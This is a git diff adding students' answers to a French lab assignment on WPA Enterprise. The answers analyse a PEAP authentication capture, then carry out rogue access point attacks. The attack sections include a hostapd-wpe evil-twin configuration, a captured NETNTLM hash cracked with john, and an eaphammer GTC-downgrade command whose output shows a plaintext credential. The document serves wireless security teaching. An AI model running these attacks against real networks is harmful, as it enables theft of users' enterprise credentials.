@@ -48,55 +48,134 @@ A tittre d'exemple, voici [une connexion WPA Entreprise](files/auth.pcap) qui co
 
 Pour réussir votre capture, vous pouvez procéder de la manière suivante :
 
-- 	Identifier l'AP le plus proche, en identifiant le canal utilisé par l’AP dont la puissance est la plus élevée (et dont le SSID est HEIG-VD...). Vous pouvez faire ceci avec ```airodump-ng```, par exemple
--   Lancer une capture avec Wireshark
--   Etablir une connexion depuis un poste de travail (PC), un smartphone ou n'importe quel autre client WiFi. __Attention__, il est important que la connexion se fasse à 2.4 GHz pour pouvoir sniffer avec les interfaces Alfa
+- Identifier l'AP le plus proche, en identifiant le canal utilisé par l’AP dont la puissance est la plus élevée (et dont le SSID est HEIG-VD...). Vous pouvez faire ceci avec ```airodump-ng```, par exemple
+
+- Lancer une capture avec Wireshark
+
+- Etablir une connexion depuis un poste de travail (PC), un smartphone ou n'importe quel autre client WiFi. __Attention__, il est important que la connexion se fasse à 2.4 GHz pour pouvoir sniffer avec les interfaces Alfa
+
 - Comparer votre capture au processus d’authentification donné en théorie (n’oubliez pas les captures d'écran pour illustrer vos comparaisons !). En particulier, identifier les étapes suivantes :
 	- Requête et réponse d’authentification système ouvert
- 	- Requête et réponse d’association (ou reassociation)
-	- Négociation de la méthode d’authentification entreprise (TLS?, TTLS?, PEAP?, LEAP?, autre?)
-	- Phase d’initiation
-	- Phase hello :
-		- Version TLS
-		- Suites cryptographiques et méthodes de compression proposées par le client et acceptées par l’AP
-		- Nonces
-		- Session ID
-	- Phase de transmission de certificats
-	 	- Echanges des certificats
-		- Change cipher spec
-	- Authentification interne et transmission de la clé WPA (échange chiffré, vu par Wireshark comme « Application data »)
-	- 4-way handshake
+	
+	> Requête d'authentification :
+	>
+	> ![auth1](./img/auth1.PNG)
+	
+	> Réponse d'authentification :
+	>
+	> ![auth2](./img/auth2.PNG)
+
+  - Requête et réponse d’association (ou reassociation)
+
+  > Requête d'association :
+  >
+  > ![assoc1](./img/assoc1.PNG)
+
+  > Réponse d'association :
+  >
+  > ![assoc2](./img/assoc2.PNG)
+
+  - Négociation de la méthode d’authentification entreprise (TLS?, TTLS?, PEAP?, LEAP?, autre?)
+
+    > ![meth_auth](./img/meth_auth.PNG)
+    >
+    > Le serveur propose PEAP en premier et est directement accepté par le client.
+
+  - Phase d’initiation
+
+    > Request et Response Identity :
+    >
+    > ![init](./img/init.PNG)
+
+  - Phase hello :
+  	- Version TLS
+  	
+  	  > La version TLS utilisée par le client et le serveur est la 1.2.
+  	
+  	- Suites cryptographiques et méthodes de compression proposées par le client et acceptées par l’AP
+  	
+  	  > Le client propose 21 suites cryptographiques, le serveur choisit la TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384.
+  	  >
+  	  > Aucune méthode de compression n'est proposée.
+  	
+  	- Nonces
+  	
+  	  > Visibles dans les champs 'Random'.
+  	
+  	- Session ID
+  	
+  	  > Visibles dans les champs 'Session ID'.
+  	
+  	> Client Hello :
+  	>
+  	> ![clientHello](./img/clientHello.PNG)
+  	
+  	> Server Hello :
+  	>
+  	> ![serverHello](./img/serverHello.PNG)
+  	
+  - Phase de transmission de certificats
+
+    > 1 certificat serveur et 2 certificats client :
+    >
+    > ![certificats](./img/certificats.PNG)
+
+    - Echanges des certificats
+    - Change cipher spec
+
+      > ![cipher](./img/cipher.PNG)
+
+  - Authentification interne et transmission de la clé WPA (échange chiffré, vu par Wireshark comme « Application data »)
+
+    > ![application_data](./img/application_data.PNG)
+
+  - 4-way handshake
+
+    > ![4-way](./img/4-way.PNG)
+    >
+    > P.S: Drôle de comportement ici où il nous manque le message 3 sur 4.
 
 ### Répondez aux questions suivantes :
- 
+
 > **_Question :_** Quelle ou quelles méthode(s) d’authentification est/sont proposé(s) au client ?
-> 
-> **_Réponse :_** 
+>
+> **_Réponse :_** L'AP propose d'abord la méthode EAP-PEAP, qui est directement accepté par le client. Donc il lui n'en propose plus d'autres.
+>
+> ![client_hello](./img/client_hello.PNG)
 
 ---
 
 > **_Question:_** Quelle méthode d’authentification est finalement utilisée ?
-> 
-> **_Réponse:_** 
+>
+> **_Réponse:_** PEAP
 
 ---
 
-> **_Question:_**Arrivez-vous à voir l’identité du client dans la phase d'initiation ? Oui ? Non ? Pourquoi ?
-> 
-> **_Réponse:_** 
+> **_Question:_** Arrivez-vous à voir l’identité du client dans la phase d'initiation ? Oui ? Non ? Pourquoi ?
+>
+> **_Réponse:_** Oui, car la trame n'est pas chiffrée et le serveur n'a sûrement pas été configuré pour pouvoir s'annoncer en anonyme. 
+>
+> ![part1_question3](./img/part1_question3.PNG)
 
 ---
 
 > **_Question:_** Lors de l’échange de certificats entre le serveur d’authentification et le client :
-> 
+>
 > - a. Le serveur envoie-t-il un certificat au client ? Pourquoi oui ou non ?
-> 
-> **_Réponse:_**
-> 
+>
+> **_Réponse:_** Oui, car le client a besoin d'authentifier l'AP pour être sûr que celui-ci n'est pas un AP malveillant.
+>
+> ![certificate_server](./img/certificate_server.png)
+>
 > - b. Le client envoie-t-il un certificat au serveur ? Pourquoi oui ou non ?
-> 
-> **_Réponse:_**
-> 
+>
+> **_Réponse: ** Oui, car le serveur a sûrement demandé au client son certificat pour pouvoir également l'authentifier.
+>
+> ![certificate_client](./img/certificate_client.png)
+>
+> Certificat dans Windows :
+>
+> ![certif_client](./img/certif_client.PNG)
 
 ---
 
@@ -121,20 +200,51 @@ Pour implémenter l’attaque :
 ### Répondez aux questions suivantes :
 
 > **_Question :_** Quelles modifications sont nécessaires dans la configuration de hostapd-wpe pour cette attaque ?
-> 
-> **_Réponse :_** 
+>
+> **_Réponse :_** Nous avons dû simplement définir le nom du ssid et le channel :
+>
+> ```
+> # 802.11 Options
+> ssid=heig-wd
+> channel=1
+> ```
 
 ---
 
 > **_Question:_** Quel type de hash doit-on indiquer à john ou l'outil que vous avez employé pour craquer le handshake ?
-> 
-> **_Réponse:_** 
+>
+> **_Réponse:_** Nous avons utilisé le hash NETNTLM suivant : 
+>
+> ```
+> wenes.limem:$NETNTLM$16a1b5da924ef3de$1c56009c8711ea944f02d1c4d89da0b2d9ab7476226df183
+> ```
+>
+> Puis utilisé john pour le brute-forcer :
+>
+> ```
+> john hash.txt
+> Created directory: /home/kali/.john
+> Warning: detected hash type "netntlm", but the string is also recognized as "netntlm-naive"
+> Use the "--format=netntlm-naive" option to force loading these as that type instead
+> Using default input encoding: UTF-8
+> Loaded 1 password hash (netntlm, NTLMv1 C/R [MD4 DES (ESS MD5) 256/256 AVX2 8x3])
+> Warning: no OpenMP support for this hash type, consider --fork=2
+> Proceeding with single, rules:Single
+> Press 'q' or Ctrl-C to abort, almost any other key for status
+> Almost done: Processing the remaining buffered candidate passwords, if any.
+> Warning: Only 895 candidates buffered for the current salt, minimum 1008 needed for performance.
+> Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+> password         (wenes.limem)
+> 1g 0:00:00:00 DONE 2/3 (2022-05-19 09:49) 4.545g/s 63118p/s 63118c/s 63118C/s 123456..petey
+> Use the "--show --format=netntlm" options to display all of the cracked passwords reliably
+> Session completed
+> ```
 
 ---
 
 > **_Question:_** Quelles méthodes d’authentification sont supportées par hostapd-wpe ?
 > 
-> **_Réponse:_**
+> **_Réponse:_** WPA, WPA2, EAP, RADIUS
 
 
 ### 3. GTC Downgrade Attack avec [EAPHammer](https://github.com/s0lst1c3/eaphammer) 
@@ -150,14 +260,36 @@ Pour implémenter l’attaque :
 ### Répondez aux questions suivantes :
 
 > **_Question :_** Expliquez en quelques mots l'attaque GTC Downgrade
-> 
-> **_Réponse :_** 
+>
+> **_Réponse :_**  On oblige les clients à utiliser la méthode EAP-GTC pour s'authentifier.
+>
+> Au cas où les clients n'accepteraient pas la méthode EAP-GTC on peut aussi tester une attaque EAP downgrade, en modifiant le fichier de configuration de hostapd où il y a une ligne qui contient les méthodes EAP de la plus forte à la moins forte, en inversant les valeurs pour qu'elles soient de la moins forte à la plus forte.
+>
+> *Source : https://solstice.sh/iii-eap-downgrade-attacks/*
+>
+> Voici comment nous avons réalisé l'attaque :
+>
+> ```
+> sudo ./eaphammer -i wlan0 -e heig-wd --auth wpa-eap --creds --negotiate gtc-downgrade
+> ```
+>
+> Et le résultat de l'attaque :
+>
+> ```
+> GTC: Thu May 19 11:24:50 2022
+>          username:      wenes.limem
+>          password:      password
+> wlan0: CTRL-EVENT-EAP-FAILURE 7e:20:33:0a:34:6e
+> wlan0: STA 7e:20:33:0a:34:6e IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
+> wlan0: STA 7e:20:33:0a:34:6e IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
+> wlan0: STA 7e:20:33:0a:34:6e IEEE 802.11: deauthenticated due to local deauth request
+> ```
 
 ---
 
 > **_Question:_** Quelles sont vos conclusions et réflexions par rapport à la méthode hostapd-wpe ?
 > 
-> **_Réponse:_** 
+> **_Réponse:_** Cette attaque est plus simple a réaliser car il n'y a pas de fichier de configuration à modifier et en plus cet outil craque directement le mot de passe, donc c'est un gain de temps. 
 
 
 ### 4. En option, vous pouvez explorer d'autres outils comme [eapeak](https://github.com/rsmusllp/eapeak) ou [crEAP](https://github.com/W9HAX/crEAP/blob/master/crEAP.py) pour les garder dans votre arsenal de pentester.
